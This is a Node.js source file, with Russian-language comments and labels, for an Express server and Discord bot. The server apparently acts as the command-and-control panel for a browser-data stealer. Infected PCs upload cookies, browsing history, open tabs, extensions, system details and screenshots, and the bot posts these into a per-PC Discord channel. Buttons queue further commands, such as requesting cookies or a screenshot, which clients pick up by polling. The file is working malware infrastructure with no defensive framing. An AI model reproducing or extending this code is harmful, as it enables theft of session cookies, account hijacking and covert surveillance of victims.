import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle } from "discord.js";

const app = express();
app.use(express.json({ limit: "50mb" }));

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "Все ПК";

const onlinePCs = {};
const pendingCommands = {};

const bot = new Client({ intents: [GatewayIntentBits.Guilds] });

bot.once("clientReady", () => {
  console.log(`✅ Бот вошёл как ${bot.user.tag}`);
});

// ------------------ Кнопки ------------------
function createControlButtons(pcId) {
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`check_online-${pcId}`)
      .setLabel("Чек онлайн")
      .setStyle(ButtonStyle.Primary),
    new ButtonBuilder()
      .setCustomId(`get_cookies-${pcId}`)
      .setLabel("Запросить куки")
      .setStyle(ButtonStyle.Success),
    new ButtonBuilder()
      .setCustomId(`get_history-${pcId}`)
      .setLabel("Запросить историю")
      .setStyle(ButtonStyle.Success),
    new ButtonBuilder()
      .setCustomId(`get_system-${pcId}`)
      .setLabel("Системная инфо")
      .setStyle(ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId(`get_screenshot-${pcId}`)
      .setLabel("Скриншот")
      .setStyle(ButtonStyle.Secondary)
  );
  return [row];
}

// ------------------ Обработка нажатий ------------------
bot.on("interactionCreate", async interaction => {
  if (!interaction.isButton()) return;

  const [command, pcId] = interaction.customId.split("-");
  if (!onlinePCs[pcId]) {
    await interaction.reply({ content: `❌ ПК ${pcId} оффлайн`, ephemeral: true });
    return;
  }

  if (!pendingCommands[pcId]) pendingCommands[pcId] = [];
  pendingCommands[pcId].push(command);

  await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral: true });
});

// ------------------ Создание канала для ПК ------------------
async function getOrCreateCategory(guild, name) {
  let category = guild.channels.cache.find(c => c.type === 4 && c.name === name);
  if (!category) {
    category = await guild.channels.create({ name, type: 4 });
  }
  return category;
}

async function getOrCreateTextChannel(guild, name, parentId) {
  let channel = guild.channels.cache.find(c => c.type === 0 && c.name === name && c.parentId === parentId);
  if (!channel) {
    channel = await guild.channels.create({ name, type: 0, parent: parentId });
  }
  return channel;
}

// ------------------ Маршруты сервера ------------------
app.post("/upload", async (req, res) => {
  try {
    const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot } = req.body;

    onlinePCs[pcId] = Date.now();

    const guild = await bot.guilds.fetch(GUILD_ID);
    const category = await getOrCreateCategory(guild, CATEGORY_NAME);
    const channel = await getOrCreateTextChannel(guild, pcId, category.id);

    // Файлы
    const files = [];
    if (cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
    if (history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
    if (systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${pcId}-system.json` });
    if (tabs) files.push({ attachment: Buffer.from(JSON.stringify(tabs, null, 2)), name: `${pcId}-tabs.json` });
    if (extensions) files.push({ attachment: Buffer.from(JSON.stringify(extensions, null, 2)), name: `${pcId}-extensions.json` });
    if (screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });

    if (files.length) await channel.send({ files });

    // Добавляем интерактивное сообщение с кнопками
    await channel.send({ content: `Управление ПК ${pcId}`, components: createControlButtons(pcId) });

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// Ping ПК
app.post("/ping", (req, res) => {
  const { pcId } = req.body;
  if (!pcId) return res.status(400).json({ error: "pcId required" });
  onlinePCs[pcId] = Date.now();

  const commands = pendingCommands[pcId] || [];
  pendingCommands[pcId] = [];
  res.json({ commands });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));

bot.login(DISCORD_BOT_TOKEN);
